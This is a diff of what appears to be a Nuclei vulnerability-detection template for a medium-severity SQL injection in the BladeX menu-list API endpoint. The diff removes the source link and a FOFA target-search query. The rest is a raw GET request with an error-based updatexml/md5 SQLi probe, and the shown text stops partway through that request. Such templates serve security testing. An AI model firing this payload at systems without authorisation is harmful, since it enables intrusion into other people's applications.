@@ -3,12 +3,8 @@ info:
   name: bladex-blade-system-menu-list-sqli注入
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ybe2p5e4lx4i1eeo'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ybe2p5e4lx4i1eeo
-    fofa: body="[https://bladex.vip/"](https://bladex.vip/"" \o "https%3A%2F%2Fbladex.vip%2F%26quot%3B" \t "https://wx.zsxq.com/dweb2/index/group/_blank)
 http:
 - raw:
   - 'GET /api/blade-system/menu/menu-list?updatexml(1,concat(0x5c,md5(12345),0x5c),1)=1 HTTP/1.1
